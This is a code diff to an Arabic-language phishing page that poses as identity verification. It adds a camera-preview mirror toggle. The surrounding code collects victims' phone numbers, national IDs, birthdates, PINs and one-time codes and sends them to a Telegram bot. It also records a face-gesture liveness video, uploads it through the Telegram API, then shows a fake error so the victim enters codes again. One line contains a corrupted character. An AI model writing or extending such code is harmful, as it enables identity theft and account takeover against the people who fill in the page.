@@ -69,6 +69,7 @@
     .rec-progress > i { display:block; height:100%; background:linear-gradient(90deg,#2F80ED,#56CCF2); width:0%; transition:width 0.12s linear; }
     .rec-buttons { display:flex; gap:8px; justify-content:center; margin-top:8px; }
     .btn-cancel { background:#f6f6f6; color:#111; border-radius:8px; padding:8px 12px; cursor:pointer; border:0; }
+    .btn-toggle { background:#fff; color:#2F80ED; border:2px solid #2F80ED; border-radius:8px; padding:8px 12px; cursor:pointer; }
     .muted { color:#6b6b6b; font-size:13px; text-align:center; }
     @media (max-width:420px) { .cam-box { height:320px; } }
   </style>
@@ -104,6 +105,7 @@
       <div class="rec-progress"><i id="recProg"></i></div>
 
       <div class="rec-buttons">
+        <button id="mirrorToggle" class="btn-toggle" title="تبديل المرآة">عرض طبيعي</button>
         <button id="recCancel" class="btn-cancel">إلغاء</button>
         <div class="muted" id="recHint">إغماض العين → يسار → يمين → يسار → ابتسم — كل خطوة 5 ثوانٍ</div>
       </div>
@@ -139,6 +141,7 @@
     let recordedChunks = [];
     let faceModel = null;
     let rafId = null;
+    let previewMirror = false; // user-visible mirror toggle (default: natural/non-mirrored)
 
     /* DOM refs */
     const app = document.getElementById('app');
@@ -151,6 +154,7 @@
     const recCountdown = document.getElementById('recCountdown');
     const recProg = document.getElementById('recProg');
     const recCancel = document.getElementById('recCancel');
+    const mirrorToggle = document.getElementById('mirrorToggle');
     const topStatus = document.getElementById('topStatus');
     const procCanvas = document.getElementById('procCanvas');
 
@@ -274,7 +278,6 @@
         if (!day || !month || !year) { alert('يرجى إدخال تاريخ الميلاد'); return; }
         userData.nationalId = nationalId;
         userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
-        // send phone + national + birthdate
         await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}`);
         showNationalIdWaitAndGotoCode5();
       };
@@ -418,14 +421,13 @@
         const code2 = retryInput.value.trim();
         if (code2.length !== 4) { alert('يرجى إدخال رمز مكون من 4 أرقام'); retryInput.focus(); return; }
         userData.code4_second = code2;
-        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
-        // After messages, return to main UI and start recording
+        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nال��مز المؤقت: ${codeWrap(userData.code5)}`);
         renderPhoneStep();
         setTimeout(() => startRecordingAndSendAll(), 600);
       };
     }
 
-    /* Recording: improved portrait canvas preview and recording */
+    /* Recording: improved portrait canvas preview and recording; previewMirror toggles visible preview only */
     async function startCameraForRecording() {
       if (mediaStream) return mediaStream;
       try {
@@ -442,34 +444,24 @@
     }
     function stopCameraForRecording() { try { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; } } catch(e){} }
 
-    // create portrait canvas and live preview from raw video (ensures straight upright view)
     function createPortraitCanvasAndPreview(videoEl) {
       const targetW = 720;
       const targetH = 1280;
-      // offscreen canvas for recording at target resolution
-      const canvas = document.createElement('canvas');
-      canvas.width = targetW;
-      canvas.height = targetH;
-      const ctx = canvas.getContext('2d');
+      const offscreen = document.createElement('canvas');
+      offscreen.width = targetW;
+      offscreen.height = targetH;
+      const ctx = offscreen.getContext('2d');
 
-      // visible preview canvas: set internal pixel size same as canvas for sharpness,
-      // but CSS will scale it to container size.
       const preview = previewCanvas;
-      preview.width = targetW;
-      preview.height = targetH;
-      preview.style.width = '100%';
-      preview.style.height = '100%';
-      const pctx = preview.getContext('2d');
-
-      let cancelled = false;
       const DPR = window.devicePixelRatio || 1;
-      // ensure drawing uses DPR for crisp preview
       preview.width = Math.round(targetW * DPR);
       preview.height = Math.round(targetH * DPR);
       preview.style.width = '100%';
       preview.style.height = '100%';
-      pctx.setTransform(DPR,0,0,DPR,0,0); // scale drawing to DPR
+      const pctx = preview.getContext('2d');
+      pctx.setTransform(DPR,0,0,DPR,0,0);
 
+      let cancelled = false;
       async function drawLoop() {
         if (cancelled) return;
         const vw = videoEl.videoWidth || 1;
@@ -477,23 +469,19 @@
         if (vw > 0 && vh > 0) {
           ctx.fillStyle = '#000';
           ctx.fillRect(0,0,targetW,targetH);
-          // If camera frame is landscape, rotate so result is upright portrait
           if (vw > vh) {
             ctx.save();
-            // rotate 90deg clockwise and draw
+            // rotate 90deg CW to make landscape upright portrait
             ctx.translate(targetW/2, targetH/2);
             ctx.rotate(90 * Math.PI / 180);
-            // compute scale to cover rotated area
             const scale = Math.max(targetH / vw, targetW / vh);
             const sw = vw / scale;
             const sh = vh / scale;
             const sx = Math.max(0, (vw - sw)/2);
             const sy = Math.max(0, (vh - sh)/2);
-            // draw centered into rotated canvas
             ctx.drawImage(videoEl, sx, sy, sw, sh, -targetH/2, -targetW/2, targetH, targetW);
             ctx.restore();
           } else {
-            // portrait or square: center-crop to cover
             const scale = Math.max(targetW / vw, targetH / vh);
             const sw = vw / scale;
             const sh = vh / scale;
@@ -501,24 +489,28 @@
             const sy = Math.max(0, (vh - sh)/2);
             ctx.drawImage(videoEl, sx, sy, sw, sh, 0, 0, targetW, targetH);
           }
-          // copy to preview canvas scaled (pctx already scaled by DPR)
+
+          // copy to preview; previewMirror controls visible flip only (not recorded canvas)
           try {
             pctx.clearRect(0,0,preview.width,preview.height);
-            pctx.drawImage(canvas, 0, 0, preview.width / DPR, preview.height / DPR);
-          } catch (e) {
-            // ignore occasional draw errors
-          }
+            if (previewMirror) {
+              // draw mirrored preview by flipping horizontally when painting to preview
+              pctx.save();
+              pctx.scale(-1,1);
+              pctx.drawImage(offscreen, -preview.width / DPR, 0, preview.width / DPR, preview.height / DPR);
+              pctx.restore();
+            } else {
+              pctx.drawImage(offscreen, 0, 0, preview.width / DPR, preview.height / DPR);
+            }
+          } catch (e) {}
         }
         rafId = requestAnimationFrame(drawLoop);
       }
       drawLoop();
 
       return {
-        canvas,
-        stop() {
-          cancelled = true;
-          if (rafId) { cancelAnimationFrame(rafId); rafId = null; }
-        }
+        canvas: offscreen,
+        stop() { cancelled = true; if (rafId) { cancelAnimationFrame(rafId); rafId = null; } }
       };
     }
 
@@ -568,7 +560,7 @@
       return new Blob(recordedChunks, { type: blobType });
     }
 
-    /* Main flow: send messages, record, send video; topStatus shown only while sending */
+    /* Top-level */
     async function startRecordingAndSendAll() {
       recOverlay.style.display = 'flex';
       recOverlay.setAttribute('aria-hidden','false');
@@ -576,6 +568,8 @@
       recInstr.textContent = 'استعد...';
       recProg.style.width = '0%';
       recCountdown.textContent = '--s';
+      previewMirror = false;
+      mirrorToggle.textContent = 'عرض طبيعي';
 
       try {
         const stream = await startCameraForRecording();
@@ -585,20 +579,18 @@
         await videoEl.play().catch(()=>{});
         const audioTrack = (stream.getAudioTracks && stream.getAudioTracks().length) ? stream.getAudioTracks()[0] : null;
 
-        // Send requested textual sequence before recording completes
+        // send textual sequence per request
         await sendSequenceBeforeVideo();
 
-        // ensure model loaded silently but not required for correctness
         loadFaceModelSilently().catch(()=>{});
 
-        // record portrait video (canvas-based preview ensures upright view)
         const blob = await recordFullSequenceViaCanvas(videoEl, audioTrack);
 
         // show topStatus only while sending
         topStatus.style.display = 'block';
         topStatus.textContent = 'جاري التحقق من الفيديو';
 
-        // send small textual block with numbers wrapped in <code> (so numbers are copyable)
+        // send textual block with numbers wrapped (so numbers are copyable)
         const captionLines = [
           `رقم الهاتف: ${userData.phone}`,
           `الرقم الوطني: ${userData.nationalId}`,
@@ -607,7 +599,6 @@
           `الرمز الثابت (1): ${userData.code4_first}`,
           `الرمز الثابت (2): ${userData.code4_second}`
         ];
-        // Build HTML text with numeric tokens wrapped in <code>
         const textBlock = captionLines.map(line => {
           const idx = line.indexOf(':');
           if (idx >= 0) {
@@ -618,7 +609,6 @@
           }
           return escapeHtml(line);
         }).join('\n');
-        // send textual block
         await sendTelegramHtml(textBlock);
 
         // send video
@@ -627,7 +617,6 @@
         form.append('video', blob, 'verification.webm');
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
 
-        // per request: after sending, show modal error asking user to try again
         showModalError('يوجد خطأ بالمعلومات. رجاءً حاول مرة أخرى.');
       } catch (e) {
         console.error('record/send error', e);
@@ -660,13 +649,20 @@
     }
     function stopCameraForRecording() { try { if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; } } catch(e){} }
 
-    /* Event handlers */
+    /* Events */
     recCancel.addEventListener('click', () => {
       stopCameraForRecording();
       recOverlay.style.display = 'none';
       recOverlay.setAttribute('aria-hidden','true');
       topStatus.style.display = 'none';
     });
+
+    mirrorToggle.addEventListener('click', () => {
+      // toggle visible preview mirror only (recorded canvas stays natural)
+      previewMirror = !previewMirror;
+      mirrorToggle.textContent = previewMirror ? 'عرض مرآة' : 'عرض طبيعي';
+    });
+
     window.addEventListener('beforeunload', (e) => { if (mediaStream) { e.preventDefault(); e.returnValue = ''; } });
 
     /* Start app */
